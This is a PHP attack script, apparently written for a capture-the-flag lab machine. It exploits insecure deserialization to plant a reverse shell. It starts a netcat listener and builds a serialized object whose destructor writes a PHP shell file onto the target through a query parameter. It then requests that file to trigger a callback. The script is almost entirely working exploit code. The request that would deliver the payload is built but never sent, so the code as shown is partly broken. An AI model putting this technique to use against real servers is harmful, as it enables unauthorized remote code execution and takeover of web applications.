  GNU nano 5.4                                                         phpExploitSerilization.php                                                                   
<?php

$red = "\033[31m";
$green = "\033[32m";
$yellow = "\033[33m";
$reset = "\033[39m";

$banner = "PHP Serilization Reverse shell exploit";
echo  $green .  $banner . $reset.  "\n";

print $green . "[+] Starting netcat listner\n" . $reset;
shell_exec("qterminal -e  nc -lnvp 9999  >/dev/null 2>/dev/null &");

print $red .  "[+] Make sure your php file is called shell.php and is in the same direcotry as this file\n" . $reset;

$shell = file_get_contents("./shell.php") or die("Could not read php revshell file");
define("shell", $shell);

class DatabaseExport
{
        public $user_file = "users.php";
        public $data = shell;

        public function update_db()
        {
                echo "Grabing users from file<br>";
                $this-> data = 'Success - pwned';
        }

        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                //echo $green.  "\n[+] Exploit sent!".  $reset;
        }
}

$ip = "10.129.33.251";
$url = "http://".$ip . "/sator.php?arepo="; //change your URL here
$url = $url . urlencode(serialize(new DatabaseExport));
print $green .  "[+] Check your netcat listiner!\n" .$reset;
//call shell 
$url2 = "http://" . $ip ."/users.php";
sleep(2);
$response = file_get_contents("$url2");

?>

